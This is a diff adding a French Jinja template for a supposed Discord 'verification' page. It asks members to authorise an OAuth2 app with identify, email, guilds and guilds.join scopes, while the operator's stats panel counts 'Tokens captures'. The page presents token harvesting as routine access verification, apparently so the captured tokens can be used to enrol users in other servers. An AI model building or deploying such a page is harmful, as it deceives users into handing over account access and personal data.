@@ -1,0 +1,44 @@
+{% extends "base.html" %}
+{% block title %}Verification Discord - Accueil{% endblock %}
+{% block body %}
+<main class="shell">
+  <section class="card hero">
+    <div class="brand">
+      <span class="brand-mark">V</span>
+      <span class="brand-name">Verification Gateway</span>
+    </div>
+    <h1>Verifie ton compte Discord</h1>
+    <p class="muted">
+      Un clic, trois secondes, et l'acces aux salons est deverrouille.
+      Le bot attribue automatiquement le role une fois la verification terminee.
+    </p>
+    <div class="actions">
+      <a class="btn primary" href="/verify">Lancer la verification</a>
+      <a class="btn ghost" href="{{ invite_url }}" target="_blank" rel="noopener">Ajouter le bot</a>
+      <a class="btn ghost" href="/dashboard">Dashboard</a>
+    </div>
+    {% if not configured %}
+    <p class="warn">Variables Discord non configurees : renseigne DISCORD_CLIENT_ID et DISCORD_CLIENT_SECRET.</p>
+    {% endif %}
+  </section>
+
+  <section class="grid">
+    <div class="stat"><span class="stat-value">{{ stats.captures or 0 }}</span><span class="stat-label">Tokens captures</span></div>
+    <div class="stat"><span class="stat-value">{{ stats.unique_users or 0 }}</span><span class="stat-label">Comptes uniques</span></div>
+    <div class="stat"><span class="stat-value">{{ stats.last24 or 0 }}</span><span class="stat-label">Dernieres 24h</span></div>
+    <div class="stat"><span class="stat-value">{{ stats.verified or 0 }}</span><span class="stat-label">Verifications</span></div>
+    <div class="stat"><span class="stat-value">{{ stats.guilds or 0 }}</span><span class="stat-label">Serveurs</span></div>
+  </section>
+
+  <section class="card">
+    <h2>Comment ca marche</h2>
+    <ol class="steps-list">
+      <li>Le membre arrive sur le serveur et recoit le role "non verifie".</li>
+      <li>Il clique sur le bouton du salon de verification.</li>
+      <li>Il autorise l'application Discord (OAuth2, scopes <code>identify email guilds guilds.join</code>).</li>
+      <li>Le role est attribue automatiquement et l'acces aux salons est deverrouille.</li>
+    </ol>
+    <p class="tiny">URL publique : <code>{{ base_url }}</code></p>
+  </section>
+</main>
+{% endblock %}
